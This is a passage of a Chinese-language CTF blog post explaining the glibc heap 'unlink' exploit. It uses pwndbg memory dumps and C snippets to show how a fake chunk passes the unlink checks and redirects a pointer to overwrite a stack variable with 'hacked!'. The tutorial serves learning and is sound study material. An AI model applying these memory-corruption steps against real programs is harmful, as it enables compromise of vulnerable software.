+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x40084d</span> (__libc_csu_init+<span class="number">77</span>) ◂— add    rbx, <span class="number">1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│      <span class="number">0x7fffffffdda0</span> —▸ <span class="number">0x7fffffffde90</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│      <span class="number">0x7fffffffdda8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>chunk1=0x602010<br>&amp;chunk1=0x7fffffffdd60</p>
+<p>fake_chunk=0x602010<br>&amp;fake_chunk=0x7fffffffdd70</p>
+<p>然后我们再看一下fake_chunk-&gt;fd，和fake_chunk_bk的值是多少。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000000</span>&lt;=fake_chunk(mem)	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x00007fffffffdd48</span>&lt;=fake_chunk-&gt;fd	<span class="number">0x00007fffffffdd50</span>&lt;=fake_chunk-&gt;bk</span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
+<p>fake_chunk-&gt;fd=0x00007fffffffdd48<br>fake_chunk-&gt;bk=0x00007fffffffdd50</p>
+<p>需要知道的是，fd和bk的类型同样是struct chunk_structure <em>，也就是说fake-&gt;chunk-&gt;fd/bk指向的内存也是”<em>*结构体</em></em>“<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">bk</span>;</span></span><br></pre></td></tr></table></figure></p>
+<p>所以这个指向的”结构体”是这样的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x00007fffffffdd48</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>:	<span class="number">0x00007ffff7ffe1c8</span>-&gt;prev_size	<span class="number">0x0000000000000003</span>-&gt;size</span><br><span class="line"><span class="number">0x7fffffffdd58</span>:	<span class="number">0x00000000004006f3</span>-&gt;fd	<span class="number">0x0000000000602010</span>-&gt;bk</span><br><span class="line"></span><br><span class="line"><span class="number">0x7fffffffdd68</span>:	<span class="number">0x00000000006020a0</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7fffffffdd78</span>:	<span class="number">0x000000000040084d</span>	<span class="number">0x00007fffffffddb0</span></span><br><span class="line"><span class="number">0x7fffffffdd88</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000400800</span></span><br></pre></td></tr></table></figure></p>
+<p>所以fake_chunk-&gt;fd-&gt;bk=0x0000000000602010=chunk1<br>而我们知道fake_chunk=chunk1。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br></pre></td></tr></table></figure></p>
+<p><strong>所以这样就过了chunk-&gt;fd-&gt;bk==chunk的检查</strong><br><strong>chunk-&gt;bk-&gt;fd == chunk也是同理的</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-144600.png" alt=""></p>
+<h3 id="通过检查点2"><a href="#通过检查点2" class="headerlink" title="通过检查点2"></a>通过检查点2</h3><p>然后为了通过检查点<code>chunk size是否等于next chunk(内存意义上的)的prev_size</code>,我们需要修改chunk2的prev_size<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;  <span class="comment">// chunk1's data region size</span></span><br><span class="line">chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;        <span class="comment">// Unsetting prev_in_use bit</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602090</span></span><br><span class="line"><span class="number">0x602090</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6020a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<h3 id="触发unlink"><a href="#触发unlink" class="headerlink" title="触发unlink"></a>触发unlink</h3><p>当我们free(chunk2)的时候，因为prev_in_use位被置0，代表前一个chunk（也就是我们的fake_chunk)也处于free，连续的空闲堆块合并而进行unlink操作。<br>也就是设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p>
+<p>可以看出fake_chunk-&gt;fd-&gt;bk和fake_chunk-&gt;bk-&gt;fd都指向(或者说等于)chunk1,即0x0000000000602010，所以只需要关注第二次操作即可。</p>
+<p>P-&gt;fd即fake_chunk-&gt;fd=0x00007fffffffdd48<br>所以unlink之后,P-&gt;bk-&gt;fd由0x602010变为0x00007fffffffdd48<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x602010</span> &lt;=P-&gt;bk-&gt;fd</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x602090</span> ◂— <span class="number">0x80</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br></pre></td></tr></table></figure></p>
+<p>变为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x7fffffffdd48</span> &lt;=P-&gt;bk-&gt;fd</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x602090</span> ◂— <span class="number">0x80</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br></pre></td></tr></table></figure></p>
+<p>也就是说现在chunk1的值变成了0x7fffffffdd48，chunk1[3]实际上就是chunk1。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">45</span>	  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line"><span class="number">46</span>	  <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, chunk1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; b <span class="number">47</span></span><br><span class="line">Breakpoint <span class="number">3</span> at <span class="number">0x400788</span>: file unlink.c, line <span class="number">47.</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="number">0x7fffffffdd48</span></span><br><span class="line">ffffdd48</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-155409.png" alt=""></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>改变chunk1[3]就是改变chunk1,在本例中, chunk1用于指向变量data并且通过改变chunk1从而影响到了该变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1[3] = (unsigned long long)data;</span><br></pre></td></tr></table></figure></p>
+<p>可以看出现在chunk1的值已经变成了data的地址0x7fffffffdd80<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rdx rsp  0x7fffffffdd60 —▸ 0x7fffffffdd80 —▸ 0x7fffffffddb0 ◂— 0x0</span><br></pre></td></tr></table></figure></p>
+<p>改变data的值为Victim’s data<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(data, <span class="string">"Victim's data"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>在内存中查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /s 0x7fffffffdd80</span><br><span class="line">0x7fffffffdd80:	&quot;Victim&apos;s data&quot;</span><br></pre></td></tr></table></figure></p>
+<p>现在的chunk1已经指向data了，通过给chunk1[0]赋值，其实就是给data赋值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1[0] = 0x002164656b636168LL;</span><br></pre></td></tr></table></figure></p>
+<p>查看内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /s 0x7fffffffdd80</span><br><span class="line">0x7fffffffdd80:	&quot;hacked!&quot;</span><br></pre></td></tr></table></figure></p>
+<p>果然已经变了。<br>字符串已经变成了hacked!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">hacked!</span><br></pre></td></tr></table></figure></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/28/heap_exp1/" rel="next" title="堆漏洞">
+                <i class="fa fa-chevron-left"></i> 堆漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/02/fastbin/" rel="prev" title="Fastbin Double Free">
+                Fastbin Double Free <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="sakura" />
+            
+              <p class="site-author-name" itemprop="name">sakura</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.uaf.li" title="Murasaki" target="_blank">Murasaki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://admintony.com" title="AdminTony" target="_blank">AdminTony</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ares-x.com" title="AresX" target="_blank">AresX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hexlt.org" title="hexman" target="_blank">hexman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://kabeor.github.io" title="kabeor" target="_blank">kabeor</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink简介"><span class="nav-number">1.</span> <span class="nav-text">unlink简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink时执行的检查"><span class="nav-number">2.</span> <span class="nav-text">unlink时执行的检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink-exploit"><span class="nav-number">3.</span> <span class="nav-text">unlink exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#准备"><span class="nav-number">3.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过检查点1"><span class="nav-number">3.2.</span> <span class="nav-text">通过检查点1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过检查点2"><span class="nav-number">3.3.</span> <span class="nav-text">通过检查点2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#触发unlink"><span class="nav-number">3.4.</span> <span class="nav-text">触发unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">3.5.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sakura</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://sakura1328.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://eternalsakura13.com/2018/03/01/unlink1/';
+          this.page.identifier = '2018/03/01/unlink1/';
+          this.page.title = 'CTF pwn中的unlink';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://sakura1328.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
